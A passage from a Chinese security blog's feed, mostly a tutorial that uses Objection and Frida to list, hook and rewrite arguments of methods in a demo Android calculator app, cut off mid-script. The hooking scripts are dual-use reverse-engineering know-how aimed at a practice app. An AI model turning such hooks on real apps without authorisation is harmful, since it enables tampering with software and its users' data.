      &lt;h1 id=&quot;1-DLL是什么&quot;&gt;&lt;a href=&quot;#1-DLL是什么&quot; class=&quot;headerlink&quot; title=&quot;1.DLL是什么&quot;&gt;&lt;/a&gt;1.DLL是什么&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;DLL是Dynamic Link Library的缩写，意为动态链接库。在Windows中，许多应用程序并不是一个完整的&lt;a href=&quot;https://baike.baidu.com/item/可执行文件?fromModule=lemma_inlink&quot;&gt;可执行文件&lt;/a&gt;，它们被分割成一些相对独立的动态链接库，即&lt;a href=&quot;https://baike.baidu.com/item/DLL文件?fromModule=lemma_inlink&quot;&gt;DLL文件&lt;/a&gt;，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可有多个DLL文件，一个DLL文件也可能被几个应用程序所共用，这样的DLL文件被称为共享DLL文件。&lt;/p&gt;
&lt;p&gt;1．静态调用方式：由&lt;a href=&quot;https://baike.baidu.com/item/编译系统?fromModule=lemma_inlink&quot;&gt;编译系统&lt;/a&gt;完成对 DLL 的加载和应用程序结束时 DLL &lt;a href=&quot;https://baike.baidu.com/item/卸载?fromModule=lemma_inlink&quot;&gt;卸载&lt;/a&gt;的编码（如还有其它程序使用该 DLL，则 Windows 对 DLL 的应用记录减1，直到所有相关程序都结束对该 DLL 的使用时才释放它，简单实用，但不够灵活，只能满足一般要求。&lt;/p&gt;
&lt;p&gt;2．动态调用方式：是由编程者用 API 函数加载和&lt;a href=&quot;https://baike.baidu.com/item/卸载?fromModule=lemma_inlink&quot;&gt;卸载&lt;/a&gt; DLL 来达到调用 DLL 的目的，使用上较复杂，但能更加有效地使用内存，是编制大型应用程序时的重要方式。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="DLL劫持" scheme="http://www.ol4three.com/tags/DLL%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>objectioin实战详解</title>
    <link href="http://www.ol4three.com/2022/04/12/Android/objectioin%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/"/>
    <id>http://www.ol4three.com/2022/04/12/Android/objectioin%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/</id>
    <published>2022-04-12T07:15:36.000Z</published>
    <updated>2023-01-29T06:24:44.762Z</updated>
    
    <content type="html"><![CDATA[<p>接上篇，上篇对Objection的常用使用方法进行了总结，同时也找到两个APK进行练习测试。</p><blockquote><p>文章中使用的APK以及脚本可以在此处进行下载 <a href="https://github.com/OL4THREE/Practice-Note">Demo下载</a></p></blockquote><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/objection-20220704171740596.png" alt="objection.png"></p><a id="more"></a><h2 id="Junior"><a href="#Junior" class="headerlink" title="Junior"></a>Junior</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida, objection等版本可见上篇</span><br><span class="line"># 测试环境</span><br><span class="line">Mac OS 12.3</span><br><span class="line">Kali 2022</span><br><span class="line">Nexus 6P</span><br><span class="line">MUMU模拟器</span><br><span class="line">&#x2F;&#x2F; 安装</span><br><span class="line">╰─$ adb install -t junior.apk</span><br><span class="line">Performing Push Install</span><br><span class="line">junior.apk: 1 file pushed, 0 skipped. 16.1 MB&#x2F;s (2347060 bytes in 0.139s)</span><br><span class="line">pkg: &#x2F;data&#x2F;local&#x2F;tmp&#x2F;junior.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure><p>源代码地址: <a href="https://github.com/aqi00/android2">Junior</a></p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128154133320.png" alt="image-20230128154133320" style="zoom:50%;"><p>安装成功后首先使用Objection 遍历一下App的所有Activity</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objection -g com.example.junior explore -P ~&#x2F;.objection&#x2F;plugins</span><br><span class="line">com.example.junior on (Android: 6.0.1) [usb] # android hooking list activities</span><br><span class="line">com.example.junior.BbsActivity</span><br><span class="line">com.example.junior.CalculatorActivity</span><br><span class="line">com.example.junior.CaptureActivity</span><br><span class="line">com.example.junior.ClickActivity</span><br><span class="line">com.example.junior.ColorActivity</span><br><span class="line">com.example.junior.GravityActivity</span><br><span class="line">com.example.junior.IconActivity</span><br><span class="line">com.example.junior.MainActivity</span><br><span class="line">com.example.junior.MarginActivity</span><br><span class="line">com.example.junior.MarqueeActivity</span><br><span class="line">com.example.junior.NineActivity</span><br><span class="line">com.example.junior.PxActivity</span><br><span class="line">com.example.junior.ScaleActivity</span><br><span class="line">com.example.junior.ScreenActivity</span><br><span class="line">com.example.junior.ScrollActivity</span><br><span class="line">com.example.junior.ShapeActivity</span><br><span class="line">com.example.junior.StateActivity</span><br><span class="line"></span><br><span class="line">Found 17 classes</span><br></pre></td></tr></table></figure><p>我们启动其计算器功能</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # android intent launch_activity com.example.junior.CalculatorActivity</span><br><span class="line">(agent) Starting activity com.example.junior.CalculatorActivity...</span><br><span class="line">(agent) Activity successfully asked to start.</span><br></pre></td></tr></table></figure><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128160517143.png" alt="image-20230128160517143" style="zoom:50%;" div align="center/"><h3 id="OnCreate"><a href="#OnCreate" class="headerlink" title="OnCreate()"></a>OnCreate()</h3><p>查看CalculatorActivity.java的onCreate函数</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128160926754.png" alt="image-20230128160926754"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_calculator);</span><br><span class="line">    &#x2F;&#x2F; 从布局文件中获取名叫tv_result的文本视图</span><br><span class="line">    tv_result &#x3D; findViewById(R.id.tv_result);</span><br><span class="line">    &#x2F;&#x2F; 设置tv_result内部文本的移动方式为滚动形式</span><br><span class="line">    tv_result.setMovementMethod(new ScrollingMovementMethod());</span><br><span class="line">    &#x2F;&#x2F; 下面给每个按钮控件都注册了点击监听器</span><br><span class="line">    findViewById(R.id.btn_cancel).setOnClickListener(this); &#x2F;&#x2F; “取消”按钮</span><br><span class="line">    findViewById(R.id.btn_divide).setOnClickListener(this); &#x2F;&#x2F; “除法”按钮</span><br><span class="line">    findViewById(R.id.btn_multiply).setOnClickListener(this); &#x2F;&#x2F; “乘法”按钮</span><br><span class="line">    findViewById(R.id.btn_clear).setOnClickListener(this); &#x2F;&#x2F; “清除”按钮</span><br><span class="line">    findViewById(R.id.btn_seven).setOnClickListener(this); &#x2F;&#x2F; 数字7</span><br><span class="line">    findViewById(R.id.btn_eight).setOnClickListener(this); &#x2F;&#x2F; 数字8</span><br><span class="line">    findViewById(R.id.btn_nine).setOnClickListener(this); &#x2F;&#x2F; 数字9</span><br><span class="line">    findViewById(R.id.btn_plus).setOnClickListener(this); &#x2F;&#x2F; “加法”按钮</span><br><span class="line">    findViewById(R.id.btn_four).setOnClickListener(this); &#x2F;&#x2F; 数字4</span><br><span class="line">    findViewById(R.id.btn_five).setOnClickListener(this); &#x2F;&#x2F; 数字5</span><br><span class="line">    findViewById(R.id.btn_six).setOnClickListener(this); &#x2F;&#x2F; 数字6</span><br><span class="line">    findViewById(R.id.btn_minus).setOnClickListener(this); &#x2F;&#x2F; “减法”按钮</span><br><span class="line">    findViewById(R.id.btn_one).setOnClickListener(this); &#x2F;&#x2F; 数字1</span><br><span class="line">    findViewById(R.id.btn_two).setOnClickListener(this); &#x2F;&#x2F; 数字2</span><br><span class="line">    findViewById(R.id.btn_three).setOnClickListener(this); &#x2F;&#x2F; 数字3</span><br><span class="line">    findViewById(R.id.btn_zero).setOnClickListener(this); &#x2F;&#x2F; 数字0</span><br><span class="line">    findViewById(R.id.btn_dot).setOnClickListener(this); &#x2F;&#x2F; “小数点”按钮</span><br><span class="line">    findViewById(R.id.btn_equal).setOnClickListener(this); &#x2F;&#x2F; “等号”按钮</span><br><span class="line">    findViewById(R.id.ib_sqrt).setOnClickListener(this); &#x2F;&#x2F; “开平方”按钮</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试这个计算机之后回发现，每次按“等号”按钮后计算结果都会被打印出来。根据这一现象，找到对应的点击响应函数<code>onClick()</code>函数中属于“等号”按钮的源码部分，最终的源码如下</p><h3 id="OnClick"><a href="#OnClick" class="headerlink" title="OnClick()"></a>OnClick()</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void onClick(View v) &#123;</span><br><span class="line">    int resid &#x3D; v.getId(); &#x2F;&#x2F; 获得当前按钮的编号</span><br><span class="line">    String inputText;</span><br><span class="line">    if (resid &#x3D;&#x3D; R.id.ib_sqrt) &#123; &#x2F;&#x2F; 如果是开根号按钮</span><br><span class="line">        inputText &#x3D; &quot;√&quot;;</span><br><span class="line">    &#125; else &#123; &#x2F;&#x2F; 除了开根号按钮之外的其它按钮</span><br><span class="line">        inputText &#x3D; ((TextView) v).getText().toString();</span><br><span class="line">    &#125;</span><br><span class="line">    Log.d(TAG, &quot;resid&#x3D;&quot; + resid + &quot;,inputText&#x3D;&quot; + inputText);</span><br><span class="line">    if (resid &#x3D;&#x3D; R.id.btn_clear) &#123; &#x2F;&#x2F; 点击了清除按钮</span><br><span class="line">        clear(&quot;&quot;);</span><br><span class="line">    &#125; else if (resid &#x3D;&#x3D; R.id.btn_cancel) &#123; &#x2F;&#x2F; 点击了取消按钮</span><br><span class="line">        if (operator.equals(&quot;&quot;)) &#123; &#x2F;&#x2F; 无操作符，则表示逐位取消前一个操作数</span><br><span class="line">            if (firstNum.length() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                firstNum &#x3D; &quot;0&quot;;</span><br><span class="line">            &#125; else if (firstNum.length() &gt; 0) &#123;</span><br><span class="line">                firstNum &#x3D; firstNum.substring(0, firstNum.length() - 1);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                Toast.makeText(this, &quot;没有可取消的数字了&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            showText &#x3D; firstNum;</span><br><span class="line">            tv_result.setText(showText);</span><br><span class="line">        &#125; else &#123; &#x2F;&#x2F; 有操作符，则表示逐位取消后一个操作数</span><br><span class="line">            if (nextNum.length() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                nextNum &#x3D; &quot;&quot;;</span><br><span class="line">            &#125; else if (nextNum.length() &gt; 0) &#123;</span><br><span class="line">                nextNum &#x3D; nextNum.substring(0, nextNum.length() - 1);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                Toast.makeText(this, &quot;没有可取消的数字了&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            showText &#x3D; showText.substring(0, showText.length() - 1);</span><br><span class="line">            tv_result.setText(showText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (resid &#x3D;&#x3D; R.id.btn_equal) &#123; &#x2F;&#x2F; 点击了等号按钮</span><br><span class="line">        if (operator.length() &#x3D;&#x3D; 0 || operator.equals(&quot;＝&quot;)) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;请输入运算符&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125; else if (nextNum.length() &lt;&#x3D; 0) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;请输入数字&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (caculate()) &#123; &#x2F;&#x2F; 计算成功，则显示计算结果</span><br><span class="line">            operator &#x3D; inputText;</span><br><span class="line">            showText &#x3D; showText + &quot;&#x3D;&quot; + result;</span><br><span class="line">            tv_result.setText(showText);</span><br><span class="line">        &#125; else &#123; &#x2F;&#x2F; 计算失败，则直接返回</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (resid &#x3D;&#x3D; R.id.btn_plus || resid &#x3D;&#x3D; R.id.btn_minus &#x2F;&#x2F; 点击了加、减、乘、除按钮</span><br><span class="line">            || resid &#x3D;&#x3D; R.id.btn_multiply || resid &#x3D;&#x3D; R.id.btn_divide) &#123;</span><br><span class="line">        if (firstNum.length() &lt;&#x3D; 0) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;请输入数字&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (operator.length() &#x3D;&#x3D; 0 || operator.equals(&quot;＝&quot;) || operator.equals(&quot;√&quot;)) &#123;</span><br><span class="line">            operator &#x3D; inputText; &#x2F;&#x2F; 操作符</span><br><span class="line">            showText &#x3D; showText + operator;</span><br><span class="line">            tv_result.setText(showText);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Toast.makeText(this, &quot;请输入数字&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (resid &#x3D;&#x3D; R.id.ib_sqrt) &#123; &#x2F;&#x2F; 点击了开根号按钮</span><br><span class="line">        if (firstNum.length() &lt;&#x3D; 0) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;请输入数字&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (Double.parseDouble(firstNum) &lt; 0) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;开根号的数值不能小于0&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 进行开根号运算</span><br><span class="line">        result &#x3D; String.valueOf(Math.sqrt(Double.parseDouble(firstNum)));</span><br><span class="line">        firstNum &#x3D; result;</span><br><span class="line">        nextNum &#x3D; &quot;&quot;;</span><br><span class="line">        operator &#x3D; inputText;</span><br><span class="line">        showText &#x3D; showText + &quot;√&#x3D;&quot; + result;</span><br><span class="line">        tv_result.setText(showText);</span><br><span class="line">        Log.d(TAG, &quot;result&#x3D;&quot; + result + &quot;,firstNum&#x3D;&quot; + firstNum + &quot;,operator&#x3D;&quot; + operator);</span><br><span class="line">    &#125; else &#123; &#x2F;&#x2F; 点击了其它按钮，包括数字和小数点</span><br><span class="line">        if (operator.equals(&quot;＝&quot;)) &#123; &#x2F;&#x2F; 上一次点击了等号按钮，则清空操作符</span><br><span class="line">            operator &#x3D; &quot;&quot;;</span><br><span class="line">            firstNum &#x3D; &quot;&quot;;</span><br><span class="line">            showText &#x3D; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (resid &#x3D;&#x3D; R.id.btn_dot) &#123; &#x2F;&#x2F; 点击了小数点</span><br><span class="line">            inputText &#x3D; &quot;.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (operator.equals(&quot;&quot;)) &#123; &#x2F;&#x2F; 无操作符，则继续拼接前一个操作数</span><br><span class="line">            if (firstNum.contains(&quot;.&quot;) &amp;&amp; inputText.equals(&quot;.&quot;)) &#123;</span><br><span class="line">                return; &#x2F;&#x2F; 一个数字不能有两个小数点</span><br><span class="line">            &#125;</span><br><span class="line">            firstNum &#x3D; firstNum + inputText;</span><br><span class="line">        &#125; else &#123; &#x2F;&#x2F; 有操作符，则继续拼接后一个操作数</span><br><span class="line">            if (nextNum.contains(&quot;.&quot;) &amp;&amp; inputText.equals(&quot;.&quot;)) &#123;</span><br><span class="line">                return; &#x2F;&#x2F; 一个数字不能有两个小数点</span><br><span class="line">            &#125;</span><br><span class="line">            nextNum &#x3D; nextNum + inputText;</span><br><span class="line">        &#125;</span><br><span class="line">        showText &#x3D; showText + inputText;</span><br><span class="line">        tv_result.setText(showText);</span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>btn_equal</code>主要是在<code>caculate()</code>函数中 接下来我们使用objection来验证一下是否存在caculate()函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # android hooking list class_methods com.example.junior.CalculatorActivity</span><br><span class="line">private boolean com.example.junior.CalculatorActivity.caculate()</span><br><span class="line">private void com.example.junior.CalculatorActivity.clear(java.lang.String)</span><br><span class="line">protected void com.example.junior.CalculatorActivity.onCreate(android.os.Bundle)</span><br><span class="line">public void com.example.junior.CalculatorActivity.onClick(android.view.View)</span><br><span class="line"></span><br><span class="line">Found 4 method(s)</span><br></pre></td></tr></table></figure><h3 id="calculate"><a href="#calculate" class="headerlink" title="calculate()"></a>calculate()</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private boolean caculate() &#123;</span><br><span class="line">    if (operator.equals(&quot;＋&quot;)) &#123; &#x2F;&#x2F; 当前是相加运算</span><br><span class="line">        result &#x3D; String.valueOf(Arith.add(firstNum, nextNum));</span><br><span class="line">    &#125; else if (operator.equals(&quot;－&quot;)) &#123; &#x2F;&#x2F; 当前是相减运算</span><br><span class="line">        result &#x3D; String.valueOf(Arith.sub(firstNum, nextNum));</span><br><span class="line">    &#125; else if (operator.equals(&quot;×&quot;)) &#123; &#x2F;&#x2F; 当前是相乘运算</span><br><span class="line">        result &#x3D; String.valueOf(Arith.mul(firstNum, nextNum));</span><br><span class="line">    &#125; else if (operator.equals(&quot;÷&quot;)) &#123; &#x2F;&#x2F; 当前是相除运算</span><br><span class="line">        if (Double.parseDouble(nextNum) &#x3D;&#x3D; 0) &#123; &#x2F;&#x2F; 发现被除数是0</span><br><span class="line">            &#x2F;&#x2F; 被除数为0，要弹窗提示用户</span><br><span class="line">            Toast.makeText(this, &quot;被除数不能为零&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#x2F;&#x2F; 返回false表示运算失败</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else &#123; &#x2F;&#x2F; 被除数非0，则进行正常的除法运算</span><br><span class="line">            result &#x3D; String.valueOf(Arith.div(firstNum, nextNum));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 把运算结果打印到日志中</span><br><span class="line">    Log.d(TAG, &quot;result&#x3D;&quot; + result);</span><br><span class="line">    firstNum &#x3D; result;</span><br><span class="line">    nextNum &#x3D; &quot;&quot;;</span><br><span class="line">    &#x2F;&#x2F; 返回true表示运算成功</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中对<code>减法</code>的处理是调用<code>Arith.sub</code>函数实现的 我们通常使用objeciton来获取一个应用在内存中的所有类</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list classes</span><br><span class="line">com.example.junior on (google: 6.0.1) [usb] # android hooking list class_methods com.example.junior.util.Arith</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.add(double,double)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.add(java.lang.String,java.lang.String)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.div(double,double)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.div(double,double,int)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.div(java.lang.String,java.lang.String)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.div(java.lang.String,java.lang.String,int)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.mul(double,double)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.mul(java.lang.String,java.lang.String)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.round(double,int)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.sub(double,double)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.sub(java.lang.String,java.lang.String)</span><br><span class="line"></span><br><span class="line">Found 11 method(s)</span><br></pre></td></tr></table></figure><p>Ps: objection使用 android hooking list classes 缓存太大时可以使用如下方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">删除~&#x2F;.objection&#x2F;objection.log</span><br><span class="line">重新加载，调用在cat 即可</span><br><span class="line">╰─$ cat ~&#x2F;.objection&#x2F;objection.log | grep com.example.junior</span><br><span class="line">com.example.junior.CalculatorActivity</span><br><span class="line">com.example.junior.MainActivity</span><br><span class="line">com.example.junior.util.Arith</span><br></pre></td></tr></table></figure><h3 id="Util-Arith"><a href="#Util-Arith" class="headerlink" title="Util.Arith()"></a>Util.Arith()</h3><p>在内存中确定<code>util.Arith()</code> 函数后，便可以直接对这个函数进行hook</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # android hooking watch class_method com.example.junior.util.Arith.sub --dump-args --</span><br><span class="line">dump-backtrace --dump-return</span><br><span class="line">(agent) Attempting to watch class com.example.junior.util.Arith and method sub.</span><br><span class="line">(agent) Hooking com.example.junior.util.Arith.sub(double, double)</span><br><span class="line">(agent) Hooking com.example.junior.util.Arith.sub(java.lang.String, java.lang.String)</span><br><span class="line">(agent) Registering job gj9zcimwkem. Type: watch-method for: com.example.junior.util.Arith.sub</span><br></pre></td></tr></table></figure><p>之后在计算器中随机进行减法操作</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128163238577.png" alt="image-20230128163238577" style="zoom:50%;" div align="center/"><p>在objection中已经hook到<code>util.Arith()</code>函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # (agent) [gj9zcimwkem] Called com.example.junior.util.Arith.sub(java.lang.String, java.lang.String)</span><br><span class="line">(agent) [gj9zcimwkem] Arguments com.example.junior.util.Arith.sub(12, 5)</span><br><span class="line">(agent) [gj9zcimwkem] Return Value: 7</span><br></pre></td></tr></table></figure><p>对所有运算函数进行hook</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID       Hooks  Type</span><br><span class="line">-----------  -----  ---------------------------------------------------</span><br><span class="line">gj9zcimwkem      2  watch-method for: com.example.junior.util.Arith.sub</span><br><span class="line">7lyewxvtoip      2  watch-method for: com.example.junior.util.Arith.add</span><br><span class="line">hsdvh65digm      2  watch-method for: com.example.junior.util.Arith.mul</span><br><span class="line">i5opzx0y42e      4  watch-method for: com.example.junior.util.Arith.div</span><br></pre></td></tr></table></figure><p>同时编写frida脚本进行Hook</p><h3 id="hook-js"><a href="#hook-js" class="headerlink" title="hook.js"></a>hook.js</h3><p><strong>frida -F -l hook.js</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">        Arith.sub.implementation &#x3D; function(str,str2)&#123;</span><br><span class="line">            var result &#x3D; this.sub(str,str2)</span><br><span class="line">            console.log(&quot;str,str2,result&#x3D;&gt;&quot;, str,str2,result)</span><br><span class="line">            &#x2F;&#x2F;return result</span><br><span class="line">            &#x2F;&#x2F;打印Java调用栈</span><br><span class="line">            console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()))</span><br><span class="line">            return result</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p>发现存在报错</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.example.junior]-&gt; Error: sub(): has more than one overload, use .overload(&lt;signature&gt;) to choose from:</span><br><span class="line">.overload(&#39;java.lang.String&#39;, &#39;java.lang.String&#39;)</span><br><span class="line">.overload(&#39;double&#39;, &#39;double&#39;)</span><br><span class="line">    at throwOverloadError (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:1020)</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:707</span><br><span class="line">    at &#x2F;hook.js:11</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;vm.js:11</span><br><span class="line">    at E (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:346)</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:332</span><br><span class="line">    at input:1</span><br></pre></td></tr></table></figure><p>我们根据之前Objection的结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # (agent) [gj9zcimwkem] Called com.example.junior.util.Arith.sub(java.lang.String, java.lang.String)</span><br></pre></td></tr></table></figure><p>​                              </p><p><strong>将</strong>overload(‘java.lang.String’,’java.lang.String’)添加到代码中即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">        Arith.sub.overload(&#39;java.lang.String&#39;,&#39;java.lang.String&#39;).implementation &#x3D; function(str,str2)&#123;</span><br><span class="line">            var result &#x3D; this.sub(str,str2)</span><br><span class="line">            console.log(&quot;str,str2,result&#x3D;&gt;&quot;, str,str2,result)</span><br><span class="line">            &#x2F;&#x2F;return result</span><br><span class="line">            &#x2F;&#x2F;打印Java调用栈</span><br><span class="line">            console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()))</span><br><span class="line">            return result</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128165354224.png" alt="image-20230128165354224"></p><p>使用脚本对参数进行修改，将第二个参数修改为123</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">        Arith.sub.overload(&#39;java.lang.String&#39;,&#39;java.lang.String&#39;).implementation &#x3D; function(str,str2)&#123;</span><br><span class="line">            var result &#x3D; this.sub(str,&quot;123&quot;)</span><br><span class="line">            console.log(&quot;str,str2,result&#x3D;&gt;&quot;, str,str2,result)</span><br><span class="line">            &#x2F;&#x2F;return result</span><br><span class="line">            &#x2F;&#x2F;打印Java调用栈</span><br><span class="line">            console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()))</span><br><span class="line">            return result</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128165529840.png" alt="image-20230128165529840"></p><p> Ps: 这里123的直接传递实际上是不对的，正确的传入字符串参数的方式应该如夏，也就是使用Java中相应字符串类新建一个字符串实例传参</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var JavaString &#x3D; Java.use(&quot;java.lang.String&quot;)</span><br><span class="line">var result &#x3D; this.sub(str, JavaString.$new(&#39;123&#39;)))</span><br></pre></td></tr></table></figure><blockquote><p>这里我们去构造的新的参数的类型是根据实际函数的第二个参数类型为java.lang.String 决定的。之所以用this.sub(str,”123”)的方式传递字符串时没有报错，是因为Frida本身对JavaScript的字符串进行了转换，将JavaScript的字符串在内部转换位了Java的String类型。如果是复杂的参数，就一定要先调用Java.use() 这个APi去获取对应的类对象，然后通过$new()函数去构造一个新的参数</p></blockquote><p>call.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function callSub()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">        var JavaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        var result &#x3D; Arith.sub(JavaString.$new(&quot;123&quot;),JavaString.$new(&quot;111&quot;))</span><br><span class="line">        console.log(&quot;123 - 111 &#x3D; &quot;, result)  </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.example.junior]-&gt; callSub()</span><br><span class="line">123 - 111 &#x3D;  12</span><br></pre></td></tr></table></figure><h3 id="Rpc调用"><a href="#Rpc调用" class="headerlink" title="Rpc调用"></a>Rpc调用</h3><p>call.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function CallSub(a,b)&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">        var JavaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        var result &#x3D; Arith.sub(JavaString.$new(a),JavaString.$new(b))</span><br><span class="line">        console.log(a,&quot;-&quot;,b,&quot;&#x3D;&quot;,result)  </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rpc.exports &#x3D; &#123;</span><br><span class="line">  